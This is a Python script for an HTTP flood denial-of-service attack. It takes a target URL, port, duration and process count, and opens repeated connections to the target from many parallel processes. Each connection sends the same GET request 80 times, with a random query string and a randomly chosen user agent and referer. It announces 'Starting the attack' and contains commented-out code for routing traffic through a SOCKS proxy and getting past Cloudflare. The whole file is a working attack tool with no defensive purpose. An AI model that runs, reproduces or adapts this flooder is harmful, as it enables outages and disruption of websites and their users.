import socket, ssl
import socks
import os
from time import sleep
import multiprocessing
import random
import platform
import cfscrape
import sys
import time

url=sys.argv[1]
port=int(sys.argv[2])
timeToClose=int(sys.argv[3])
threadNum=int(sys.argv[4])

start_time = time.time()
#proxies=sys.argv[4]#"C:\\Users\\steam\\Desktop\\Coding\\socks5.txt"#argv[4]s
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice

useragents=[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.31 SmartTV/6.0",
    "Safari/537.36 OPR/46.0.2207.0 OMI/4.13.5.431.DIA5HBBTV.175 Model/Sony-BRAVIA-4K-UR2",
    "Mozilla/5.0 (Linux; Andr0id 8.0.0; BRAVIA 2015 Build/OPR2.170623.027.S16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115",
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 CrKey/1.50.229764",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
    ]
try:
    os.system("ulimit -n 99999")
except Exception as e:
    print(e)
    print("Could not start the script")

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"]

referers = [
	    "https://www.google.com/search?q=",
	    "https://check-host.net/",
	    "https://www.facebook.com/",
	    "https://www.youtube.com/",
	    "https://www.fbi.com/",
	    "https://www.bing.com/search?q=",
	    "https://r.search.yahoo.com/",
	    "https://www.cia.gov/index.html",
	    "https://vk.com/profile.php?redirect=",
	    "https://www.usatoday.com/search/results?q=",
	    "https://help.baidu.com/searchResult?keywords=",
	    "https://steamcommunity.com/market/search?q=",
	    "https://www.ted.com/search?q=",
	    "https://play.google.com/store/search?q=",
	    "https://www.qwant.com/search?q=",
	    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	    "https://www.google.ad/search?q=",
	    "https://www.google.ae/search?q=",
	    "https://www.google.com.af/search?q=",
	    "https://www.google.com.ag/search?q=",
	    "https://www.google.com.ai/search?q=",
	    "https://www.google.al/search?q=",
	    "https://www.google.am/search?q=",
	    "https://www.google.co.ao/search?q="]

def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)

print("[>>>] Starting the attack [<<<]")
sleep(1)

urlfixed = UrlFixer(url)
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip

def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def genHeader():
    connection = "Connection: Keep-Alive\r\n"
    accept = "Accept: "+ Choice(acceptall)
    cach = "cache-control: max-age=0"
    referer = "Referer: "+Choice(referers)+target+ path + "\r\n"
    useragent = "User-Agent: "+Choice(useragents)
    header =  referer + useragent + accept + cach + connection + "\r\n"
    return header

def attack():
  header = genHeader()
  get_host = "GET " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
  request = get_host + header
  
  
  while True:
    if time.time() - start_time > timeToClose:
        sys.exit()
    try:
      #s = socks.socksocket()
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      #if proxies!="0":
      #   atk.set_proxy(socks.SOCKS5, '64.235.204.107', 3128)
      atk.connect((str(target), int(port)))
      if protocol == "https":
      #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #if proxies!="0":
         #atk.set_proxy(socks.SOCKS5, '64.235.204.107', 3128)
        context = ssl.SSLContext()
        atk2 = context.wrap_socket(atk, server_hostname=target)
        #cfscrape.create_scraper(sess=atk2)
        #Attack starts here
        for y in range(80):
          atk2.send(str.encode(request))
      else:
        #Attack starts here
        for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except Exception as e:
      pass

def send2attack():
  for i in range(threadNum):
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = True
    mp.start()

    
send2attack()